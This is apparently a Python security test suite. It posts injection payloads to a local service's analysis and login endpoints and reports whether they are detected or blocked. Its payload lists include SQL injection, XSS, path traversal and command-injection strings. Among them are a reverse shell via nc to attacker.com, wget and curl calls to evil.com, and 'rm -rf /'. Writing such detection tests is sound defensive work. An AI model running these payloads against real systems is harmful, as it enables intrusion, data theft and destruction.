"""
Comprehensive Security Test Suite - V1.0 Testing Framework
Automated security testing for all system components
"""
import asyncio
import aiohttp
import time
import json
import random
import string
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from datetime import datetime

@dataclass
class TestResult:
    test_name: str
    passed: bool
    response_time: float
    details: Dict[str, Any]
    severity: str = "medium"
    timestamp: datetime = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()

class SecurityTestSuite:
    def __init__(self, base_url: str = "http://127.0.0.1:8000"):
        self.base_url = base_url
        self.results = []
        self.session = None
        self.auth_token = None
        
        # Test payloads for different attack types
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1 --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; WAITFOR DELAY '00:00:05' --",
            "' OR SLEEP(5) --",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "& dir",
            "| whoami",
            "; cat /etc/passwd",
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "; wget http://evil.com/shell.sh",
            "& powershell -c \"Get-Process\"",
            "; nc -e /bin/sh attacker.com 4444",
            "| curl http://evil.com/data",
            "; rm -rf /"
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        self.ldap_injection_payloads = [
            "*)(uid=*",
            "*)(|(uid=*))",
            "*)(&(uid=*))",
            "*))%00",
            "admin)(&(password=*))"
        ]
        
        self.nosql_injection_payloads = [
            "{'$ne': null}",
            "{'$gt': ''}",
            "{'$where': 'this.username == this.password'}",
            "{'$regex': '.*'}",
            "{'$or': [{'username': 'admin'}, {'username': 'root'}]}"
        ]
    
    async def setup(self):
        """Setup test environment"""
        self.session = aiohttp.ClientSession()
        
        # Try to authenticate
        try:
            await self._authenticate()
        except Exception as e:
            print(f"Warning: Could not authenticate - {e}")
    
    async def teardown(self):
        """Cleanup test environment"""
        if self.session:
            await self.session.close()
    
    async def _authenticate(self):
        """Authenticate with the system"""
        auth_data = {
            "username": "admin",
            "password": "admin123"
        }
        
        async with self.session.post(f"{self.base_url}/auth/login", json=auth_data) as response:
            if response.status == 200:
                data = await response.json()
                self.auth_token = data.get("access_token")
                return True
        return False
    
    def _get_headers(self) -> Dict[str, str]:
        """Get headers with authentication"""
        headers = {"Content-Type": "application/json"}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        return headers
    
    async def run_all_tests(self) -> Dict[str, Any]:
        """Run all security tests"""
        print("🔍 Starting Comprehensive Security Test Suite")
        print("=" * 60)
        
        await self.setup()
        
        try:
            # Authentication tests
            await self.test_authentication_security()
            
            # Input validation tests
            await self.test_sql_injection()
            await self.test_xss_protection()
            await self.test_command_injection()
            await self.test_path_traversal()
            await self.test_ldap_injection()
            await self.test_nosql_injection()
            
            # Rate limiting tests
            await self.test_rate_limiting()
            
            # Session management tests
            await self.test_session_management()
            
            # API security tests
            await self.test_api_security()
            
            # File upload tests
            await self.test_file_upload_security()
            
            # CSRF tests
            await self.test_csrf_protection()
            
            # HTTP security headers tests
            await self.test_security_headers()
            
            # Load testing
            await self.test_load_handling()
            
        finally:
            await self.teardown()
        
        return self._generate_report()
    
    async def test_authentication_security(self):
        """Test authentication mechanisms"""
        print("🔐 Testing Authentication Security...")
        
        # Test 1: Invalid credentials
        start_time = time.time()
        try:
            async with self.session.post(
                f"{self.base_url}/auth/login",
                json={"username": "invalid", "password": "invalid"}
            ) as response:
                passed = response.status == 401
                self.results.append(TestResult(
                    test_name="Invalid Credentials Rejection",
                    passed=passed,
                    response_time=time.time() - start_time,
                    details={"status": response.status, "expected": 401},
                    severity="high"
                ))
        except Exception as e:
            self.results.append(TestResult(
                test_name="Invalid Credentials Rejection",
                passed=False,
                response_time=time.time() - start_time,
                details={"error": str(e)},
                severity="high"
            ))
        
        # Test 2: SQL injection in login
        for payload in self.sql_injection_payloads[:3]:
            start_time = time.time()
            try:
                async with self.session.post(
                    f"{self.base_url}/auth/login",
                    json={"username": payload, "password": "test"}
                ) as response:
                    passed = response.status != 200  # Should not succeed
                    self.results.append(TestResult(
                        test_name=f"Login SQL Injection - {payload[:20]}",
                        passed=passed,
                        response_time=time.time() - start_time,
                        details={"payload": payload, "status": response.status},
                        severity="critical"
                    ))
            except Exception as e:
                self.results.append(TestResult(
                    test_name=f"Login SQL Injection - {payload[:20]}",
                    passed=True,  # Exception is good - means it was blocked
                    response_time=time.time() - start_time,
                    details={"payload": payload, "error": str(e)},
                    severity="critical"
                ))
        
        # Test 3: Brute force protection
        await self._test_brute_force_protection()
    
    async def _test_brute_force_protection(self):
        """Test brute force protection"""
        print("  🔒 Testing Brute Force Protection...")
        
        # Attempt multiple failed logins
        failed_attempts = 0
        for i in range(10):
            start_time = time.time()
            try:
                async with self.session.post(
                    f"{self.base_url}/auth/login",
                    json={"username": "testuser", "password": f"wrong{i}"}
                ) as response:
                    if response.status == 429:  # Rate limited
                        self.results.append(TestResult(
                            test_name="Brute Force Protection",
                            passed=True,
                            response_time=time.time() - start_time,
                            details={"attempts_before_block": i + 1},
                            severity="high"
                        ))
                        return
                    failed_attempts += 1
            except Exception:
                pass
            
            await asyncio.sleep(0.1)  # Small delay between attempts
        
        # If we get here, brute force protection might be weak
        self.results.append(TestResult(
            test_name="Brute Force Protection",
            passed=False,
            response_time=0,
            details={"total_attempts": failed_attempts, "blocked": False},
            severity="high"
        ))
    
    async def test_sql_injection(self):
        """Test SQL injection protection"""
        print("💉 Testing SQL Injection Protection...")
        
        for payload in self.sql_injection_payloads:
            start_time = time.time()
            try:
                # Test on analyze endpoint
                async with self.session.post(
                    f"{self.base_url}/api/analyze",
                    json={"input": payload},
                    headers=self._get_headers()
                ) as response:
                    data = await response.json()
                    
                    # Check if threat was detected
                    analysis = data.get("analysis", {})
                    threat_detected = analysis.get("threat", False)
                    blocked = analysis.get("blocked", False)
                    
                    passed = threat_detected and blocked
                    
                    self.results.append(TestResult(
                        test_name=f"SQL Injection Detection - {payload[:30]}",
                        passed=passed,
                        response_time=time.time() - start_time,
                        details={
                            "payload": payload,
                            "detected": threat_detected,
                            "blocked": blocked,
                            "confidence": analysis.get("confidence", 0)
                        },
                        severity="critical"
                    ))
            except Exception as e:
                self.results.append(TestResult(
                    test_name=f"SQL Injection Detection - {payload[:30]}",
                    passed=False,
                    response_time=time.time() - start_time,
                    details={"payload": payload, "error": str(e)},
                    severity="critical"
                ))
    
    async def test_xss_protection(self):
        """Test XSS protection"""
        print("🕷️ Testing XSS Protection...")
        
        for payload in self.xss_payloads:
            start_time = time.time()
            try:
                async with self.session.post(
                    f"{self.base_url}/api/analyze",
                    json={"input": payload},
                    headers=self._get_headers()
                ) as response:
                    data = await response.json()
                    
                    analysis = data.get("analysis", {})
                    threat_detected = analysis.get("threat", False)
                    blocked = analysis.get("blocked", False)
                    
                    passed = threat_detected and blocked
                    
                    self.results.append(TestResult(
                        test_name=f"XSS Detection - {payload[:30]}",
                        passed=passed,
                        response_time=time.time() - start_time,
                        details={
                            "payload": payload,
                            "detected": threat_detected,
                            "blocked": blocked,
                            "confidence": analysis.get("confidence", 0)
                        },
                        severity="high"
                    ))
            except Exception as e:
                self.results.append(TestResult(
                    test_name=f"XSS Detection - {payload[:30]}",
                    passed=False,
                    response_time=time.time() - start_time,
                    details={"payload": payload, "error": str(e)},
                    severity="high"
                ))
    
    async def test_command_injection(self):
        """Test command injection protection"""
        print("⚡ Testing Command Injection Protection...")
        
        for payload in self.command_injection_payloads:
            start_time = time.time()
            try:
                async with self.session.post(
                    f"{self.base_url}/api/analyze",
                    json={"input": payload},
                    headers=self._get_headers()
                ) as response:
                    data = await response.json()
                    
                    analysis = data.get("analysis", {})
                    threat_detected = analysis.get("threat", False)
                    blocked = analysis.get("blocked", False)
                    
                    passed = threat_detected and blocked
                    
                    self.results.append(TestResult(
                        test_name=f"Command Injection Detection - {payload[:30]}",
                        passed=passed,
                        response_time=time.time() - start_time,
                        details={
                            "payload": payload,
                            "detected": threat_detected,
                            "blocked": blocked,
                            "confidence": analysis.get("confidence", 0)
                        },
                        severity="critical"
                    ))
            except Exception as e:
                self.results.append(TestResult(
                    test_name=f"Command Injection Detection - {payload[:30]}",
                    passed=False,
                    response_time=time.time() - start_time,
                    details={"payload": payload, "error": str(e)},
                    severity="critical"
                ))
    
    async def test_path_traversal(self):
        """Test path traversal protection"""
        print("📁 Testing Path Traversal Protection...")
        
        for payload in self.path_traversal_payloads:
            start_time = time.time()
            try:
                async with self.session.post(
                    f"{self.base_url}/api/analyze",
                    json={"input": payload},
                    headers=self._get_headers()
                ) as response:
                    data = await response.json()
                    
                    analysis = data.get("analysis", {})
                    threat_detected = analysis.get("threat", False)
                    
                    # Path traversal should be detected
                    passed = threat_detected
                    
                    self.results.append(TestResult(
                        test_name=f"Path Traversal Detection - {payload[:30]}",
                        passed=passed,
                        response_time=time.time() - start_time,
                        details={
                            "payload": payload,
                            "detected": threat_detected,
                            "confidence": analysis.get("confidence", 0)
                        },
                        severity="high"
                    ))
            except Exception as e:
                self.results.append(TestResult(
                    test_name=f"Path Traversal Detection - {payload[:30]}",
                    passed=False,
                    response_time=time.time() - start_time,
                    details={"payload": payload, "error": str(e)},
                    severity="high"
                ))
    
    async def test_ldap_injection(self):
        """Test LDAP injection protection"""
        print("🔍 Testing LDAP Injection Protection...")
        
        for payload in self.ldap_injection_payloads:
            start_time = time.time()
            try:
                async with self.session.post(
                    f"{self.base_url}/api/analyze",
                    json={"input": payload},
                    headers=self._get_headers()
                ) as response:
                    data = await response.json()
                    
                    analysis = data.get("analysis", {})
                    threat_detected = analysis.get("threat", False)
                    
                    passed = threat_detected
                    
                    self.results.append(TestResult(
                        test_name=f"LDAP Injection Detection - {payload[:30]}",
                        passed=passed,
                        response_time=time.time() - start_time,
                        details={
                            "payload": payload,
                            "detected": threat_detected,
                            "confidence": analysis.get("confidence", 0)
                        },
                        severity="medium"
                    ))
            except Exception as e:
                self.results.append(TestResult(
                    test_name=f"LDAP Injection Detection - {payload[:30]}",
                    passed=False,
                    response_time=time.time() - start_time,
                    details={"payload": payload, "error": str(e)},
                    severity="medium"
                ))
    
    async def test_nosql_injection(self):
        """Test NoSQL injection protection"""
        print("🍃 Testing NoSQL Injection Protection...")
        
        for payload in self.nosql_injection_payloads:
            start_time = time.time()
            try:
                async with self.session.post(
                    f"{self.base_url}/api/analyze",
                    json={"input": payload},
                    headers=self._get_headers()
                ) as response:
                    data = await response.json()
                    
                    analysis = data.get("analysis", {})
                    threat_detected = analysis.get("threat", False)
                    
                    passed = threat_detected
                    
                    self.results.append(TestResult(
                        test_name=f"NoSQL Injection Detection - {payload[:30]}",
                        passed=passed,
                        response_time=time.time() - start_time,
                        details={
                            "payload": payload,
                            "detected": threat_detected,
                            "confidence": analysis.get("confidence", 0)
                        },
                        severity="medium"
                    ))
            except Exception as e:
                self.results.append(TestResult(
                    test_name=f"NoSQL Injection Detection - {payload[:30]}",
                    passed=False,
                    response_time=time.time() - start_time,
                    details={"payload": payload, "error": str(e)},
                    severity="medium"
                ))
    
    async def test_rate_limiting(self):
        """Test rate limiting"""
        print("🚦 Testing Rate Limiting...")
        
        start_time = time.time()
        rate_limited = False
        
        # Send many requests quickly
        for i in range(50):
            try:
                async with self.session.get(f"{self.base_url}/health") as response:
                    if response.status == 429:
                        rate_limited = True
                        break
            except Exception:
                pass
        
        self.results.append(TestResult(
            test_name="Rate Limiting",
            passed=rate_limited,
            response_time=time.time() - start_time,
            details={"rate_limited": rate_limited, "requests_sent": i + 1},
            severity="medium"
        ))
    
    async def test_session_management(self):
        """Test session management"""
        print("🎫 Testing Session Management...")
        
        # Test invalid token
        start_time = time.time()
        try:
            headers = {"Authorization": "Bearer invalid_token"}
            async with self.session.post(
                f"{self.base_url}/api/analyze",
                json={"input": "test"},
                headers=headers
            ) as response:
                passed = response.status == 401
                
                self.results.append(TestResult(
                    test_name="Invalid Token Rejection",
                    passed=passed,
                    response_time=time.time() - start_time,
                    details={"status": response.status, "expected": 401},
                    severity="high"
                ))
        except Exception as e:
            self.results.append(TestResult(
                test_name="Invalid Token Rejection",
                passed=False,
                response_time=time.time() - start_time,
                details={"error": str(e)},
                severity="high"
            ))
    
    async def test_api_security(self):
        """Test API security"""
        print("🔌 Testing API Security...")
        
        # Test unauthorized access
        start_time = time.time()
        try:
            async with self.session.post(
                f"{self.base_url}/api/analyze",
                json={"input": "test"}
            ) as response:
                passed = response.status == 401  # Should require auth
                
                self.results.append(TestResult(
                    test_name="API Authorization Required",
                    passed=passed,
                    response_time=time.time() - start_time,
                    details={"status": response.status, "expected": 401},
                    severity="high"
                ))
        except Exception as e:
            self.results.append(TestResult(
                test_name="API Authorization Required",
                passed=False,
                response_time=time.time() - start_time,
                details={"error": str(e)},
                severity="high"
            ))
    
    async def test_file_upload_security(self):
        """Test file upload security"""
        print("📤 Testing File Upload Security...")
        
        # This is a placeholder - implement based on your file upload endpoints
        self.results.append(TestResult(
            test_name="File Upload Security",
            passed=True,  # Placeholder
            response_time=0,
            details={"note": "No file upload endpoints found"},
            severity="low"
        ))
    
    async def test_csrf_protection(self):
        """Test CSRF protection"""
        print("🛡️ Testing CSRF Protection...")
        
        # Test without CSRF token (if implemented)
        start_time = time.time()
        try:
            async with self.session.post(
                f"{self.base_url}/api/analyze",
                json={"input": "test"},
                headers=self._get_headers()
            ) as response:
                # For now, just check if endpoint is accessible
                passed = response.status in [200, 401]  # Either works or requires auth
                
                self.results.append(TestResult(
                    test_name="CSRF Protection",
                    passed=passed,
                    response_time=time.time() - start_time,
                    details={"status": response.status, "note": "Basic check"},
                    severity="medium"
                ))
        except Exception as e:
            self.results.append(TestResult(
                test_name="CSRF Protection",
                passed=False,
                response_time=time.time() - start_time,
                details={"error": str(e)},
                severity="medium"
            ))
    
    async def test_security_headers(self):
        """Test HTTP security headers"""
        print("📋 Testing Security Headers...")
        
        start_time = time.time()
        try:
            async with self.session.get(f"{self.base_url}/") as response:
                headers = response.headers
                
                # Check for important security headers
                security_headers = {
                    "X-Content-Type-Options": "nosniff",
                    "X-Frame-Options": "DENY",
                    "X-XSS-Protection": "1; mode=block",
                    "Strict-Transport-Security": None,  # Any value is good
                    "Content-Security-Policy": None
                }
                
                missing_headers = []
                for header, expected_value in security_headers.items():
                    if header not in headers:
                        missing_headers.append(header)
                    elif expected_value and headers[header] != expected_value:
                        missing_headers.append(f"{header} (wrong value)")
                
                passed = len(missing_headers) == 0
                
                self.results.append(TestResult(
                    test_name="Security Headers",
                    passed=passed,
                    response_time=time.time() - start_time,
                    details={
                        "missing_headers": missing_headers,
                        "present_headers": list(headers.keys())
                    },
                    severity="medium"
                ))
        except Exception as e:
            self.results.append(TestResult(
                test_name="Security Headers",
                passed=False,
                response_time=time.time() - start_time,
                details={"error": str(e)},
                severity="medium"
            ))
    
    async def test_load_handling(self):
        """Test load handling capabilities"""
        print("⚡ Testing Load Handling...")
        
        start_time = time.time()
        concurrent_requests = 20
        
        async def make_request():
            try:
                async with self.session.get(f"{self.base_url}/health") as response:
                    return response.status == 200
            except:
                return False
        
        # Send concurrent requests
        tasks = [make_request() for _ in range(concurrent_requests)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        successful_requests = sum(1 for r in results if r is True)
        success_rate = successful_requests / concurrent_requests
        
        passed = success_rate >= 0.8  # 80% success rate
        
        self.results.append(TestResult(
            test_name="Load Handling",
            passed=passed,
            response_time=time.time() - start_time,
            details={
                "concurrent_requests": concurrent_requests,
                "successful_requests": successful_requests,
                "success_rate": success_rate
            },
            severity="medium"
        ))
    
    def _generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive test report"""
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r.passed)
        failed_tests = total_tests - passed_tests
        
        # Group by severity
        severity_counts = {}
        for result in self.results:
            severity = result.severity
            if severity not in severity_counts:
                severity_counts[severity] = {"total": 0, "passed": 0, "failed": 0}
            
            severity_counts[severity]["total"] += 1
            if result.passed:
                severity_counts[severity]["passed"] += 1
            else:
                severity_counts[severity]["failed"] += 1
        
        # Calculate average response time
        avg_response_time = sum(r.response_time for r in self.results) / total_tests if total_tests > 0 else 0
        
        # Get failed tests
        failed_test_details = [
            {
                "name": r.test_name,
                "severity": r.severity,
                "details": r.details,
                "timestamp": r.timestamp.isoformat()
            }
            for r in self.results if not r.passed
        ]
        
        report = {
            "summary": {
                "total_tests": total_tests,
                "passed_tests": passed_tests,
                "failed_tests": failed_tests,
                "success_rate": (passed_tests / total_tests * 100) if total_tests > 0 else 0,
                "average_response_time": avg_response_time
            },
            "severity_breakdown": severity_counts,
            "failed_tests": failed_test_details,
            "all_results": [
                {
                    "test_name": r.test_name,
                    "passed": r.passed,
                    "response_time": r.response_time,
                    "severity": r.severity,
                    "details": r.details,
                    "timestamp": r.timestamp.isoformat()
                }
                for r in self.results
            ],
            "timestamp": datetime.now().isoformat(),
            "test_environment": {
                "base_url": self.base_url,
                "authenticated": self.auth_token is not None
            }
        }
        
        return report
    
    def print_summary(self):
        """Print test summary to console"""
        report = self._generate_report()
        summary = report["summary"]
        
        print("\n" + "=" * 60)
        print("🔍 SECURITY TEST RESULTS SUMMARY")
        print("=" * 60)
        print(f"Total Tests: {summary['total_tests']}")
        print(f"Passed: {summary['passed_tests']} ✅")
        print(f"Failed: {summary['failed_tests']} ❌")
        print(f"Success Rate: {summary['success_rate']:.1f}%")
        print(f"Average Response Time: {summary['average_response_time']:.3f}s")
        
        print("\n📊 SEVERITY BREAKDOWN:")
        for severity, counts in report["severity_breakdown"].items():
            print(f"  {severity.upper()}: {counts['passed']}/{counts['total']} passed")
        
        if report["failed_tests"]:
            print("\n❌ FAILED TESTS:")
            for test in report["failed_tests"]:
                print(f"  - {test['name']} ({test['severity']})")
        
        print("=" * 60)

# Standalone test runner
async def run_security_tests(base_url: str = "http://127.0.0.1:8000"):
    """Run security tests and return results"""
    suite = SecurityTestSuite(base_url)
    report = await suite.run_all_tests()
    suite.print_summary()
    return report

if __name__ == "__main__":
    import sys
    
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"
    
    async def main():
        report = await run_security_tests(base_url)
        
        # Save report to file
        with open("security_test_report.json", "w") as f:
            json.dump(report, f, indent=2)
        
        print(f"\n📄 Full report saved to: security_test_report.json")
        
        # Exit with error code if tests failed
        if report["summary"]["failed_tests"] > 0:
            sys.exit(1)
    
    asyncio.run(main())